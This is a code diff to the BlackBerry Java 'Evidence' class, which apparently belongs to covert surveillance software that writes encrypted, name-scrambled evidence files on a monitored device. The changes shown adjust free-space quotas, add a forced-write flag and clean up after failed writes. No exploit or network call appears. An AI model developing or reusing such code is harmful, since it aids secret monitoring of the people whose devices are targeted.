@@ -19,6 +19,7 @@ import javax.microedition.io.file.FileConnection;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.Status;
+import blackberry.config.Globals;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
@@ -43,14 +44,14 @@ public final class Evidence {
 
     public static int E_DELIMITER = 0xABADC0DE;
 
-    private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
+    private static final long MIN_AVAILABLE_SIZE = 10 * 1024;
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("Evidence", DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("Evidence", DebugLevel.VERBOSE);
 
     //#endif
 
-    boolean firstSpace = true;
+    //boolean firstSpace = true;
 
     boolean enoughSpace = true;
 
@@ -68,7 +69,6 @@ public final class Evidence {
     Device device;
 
     int evidenceId;
-    boolean onSD;
 
     int progressive;
 
@@ -236,7 +236,11 @@ public final class Evidence {
     }
 
     public synchronized boolean createEvidence() {
-        return createEvidence(null);
+        return createEvidence(null, false);
+    }
+
+    public boolean createEvidence(final byte[] additionalData) {
+        return createEvidence(additionalData, false);
     }
 
     /**
@@ -252,9 +256,11 @@ public final class Evidence {
      * 
      * @param additionalData
      *            the additional data
+     * @param force
      * @return true, if successful
      */
-    public synchronized boolean createEvidence(final byte[] additionalData) {
+    public synchronized boolean createEvidence(final byte[] additionalData,
+            boolean forced) {
         //#ifdef DEBUG
         debug.trace("createLog evidenceType: " + typeEvidenceId);
         //#endif
@@ -272,16 +278,18 @@ public final class Evidence {
             additionalLen = additionalData.length;
         }
 
-        enoughSpace = enoughSpace(onSD);
-        if (!enoughSpace) {
-            //#ifdef DEBUG
-            debug.trace("createEvidence, no space");
-            //#endif
-            return false;
+        if (!forced) {
+            enoughSpace = enoughSpace();
+            if (!enoughSpace) {
+                //#ifdef DEBUG
+                debug.trace("createEvidence, no space");
+                //#endif
+                return false;
+            }
         }
 
         final Vector tuple = evidenceCollector.makeNewName(this,
-                memoTypeEvidence(typeEvidenceId), onSD);
+                memoTypeEvidence(typeEvidenceId), false);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
         //#endif
@@ -305,8 +313,8 @@ public final class Evidence {
         fileName = dir + encName;
         //#ifdef DBC
         Check.asserts(fileName != null, "null fileName");
-        Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION.toUpperCase()),
-                "file not scrambled");
+        Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION
+                .toUpperCase()), "file not scrambled");
         //#endif
 
         //#ifdef DEBUG
@@ -374,25 +382,27 @@ public final class Evidence {
         return true;
     }
 
-    private boolean enoughSpace(boolean onSD) {
+    private boolean enoughSpace() {
         long free = 0;
-        if (onSD) {
-            free = Path.freeSpace(Path.SD);
-        } else {
-            free = Path.freeSpace(Path.USER);
+        free = Path.freeSpace(Path.USER);
+
+        Globals globals = Status.self().getGlobals();
+        long minQuota = MIN_AVAILABLE_SIZE;
+        if (globals != null) {
+            minQuota = globals.getQuotaMin();
         }
 
-        if (free < MIN_AVAILABLE_SIZE) {
+        if (minQuota >= 0 && free < minQuota) {
             //#ifdef DEBUG
-            if (firstSpace) {
-                firstSpace = false;
-
-                debug.fatal("not enough space. Free : " + free);
-            }
+            debug.trace("not enoughSpace: " + free + " < " + minQuota);
             //#endif
-
+            Status.self().setOverQuota(free, true);
             return false;
         } else {
+            //#ifdef DEBUG
+            debug.trace("enoughSpace: " + free + " > " + minQuota);
+            //#endif
+            Status.self().setOverQuota(free, false);
             return true;
         }
     }
@@ -472,10 +482,21 @@ public final class Evidence {
             os.write(Utils.intToByteArray(data.length - offset));
             os.write(encData);
             os.flush();
+
         } catch (final IOException e) {
             //#ifdef DEBUG
             debug.error("Error writing file: " + e);
             //#endif
+
+            close();
+            try {
+                fconn.delete();
+            } catch (IOException ex) {
+                //#ifdef DEBUG
+                debug.error("writeEvidence, deleting due to error: " + ex);
+                //#endif
+            }
+            fconn = null;
             return false;
         }
 
@@ -577,10 +598,15 @@ public final class Evidence {
     }
 
     public static void info(final String message) {
+        info(message, false);
+    }
+
+    public static void info(final String message, boolean force) {
         try {
             final Evidence logInfo = new Evidence(EvidenceType.INFO);
-
-            logInfo.atomicWriteOnce(message);
+            logInfo.createEvidence(null, force);
+            logInfo.writeEvidence(WChar.getBytes(message, true));
+            logInfo.close();
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
@@ -591,26 +617,34 @@ public final class Evidence {
 
     public synchronized void atomicWriteOnce(byte[] additionalData,
             byte[] content) {
-        createEvidence(additionalData);
-        writeEvidence(content);
+        createEvidence(additionalData, false);
+        if (!writeEvidence(content)) {
+
+        }
         close();
     }
 
     public synchronized void atomicWriteOnce(Vector bytelist) {
-        createEvidence(null);
+        createEvidence(null, false);
         writeEvidences(bytelist);
         close();
     }
 
     public synchronized void atomicWriteOnce(byte[] plain) {
-        createEvidence(null);
+        createEvidence(null, false);
         writeEvidence(plain);
         close();
     }
 
-    public synchronized void atomicWriteOnce(String string) {
-        createEvidence(null);
-        writeEvidence(WChar.getBytes(string, true));
+    public synchronized void atomicWriteOnce(String message) {
+        createEvidence(null, false);
+        writeEvidence(WChar.getBytes(message, true));
+        close();
+    }
+
+    private void atomicWriteOnce(String message, boolean force) {
+        createEvidence(null, force);
+        writeEvidence(WChar.getBytes(message, true));
         close();
     }
 
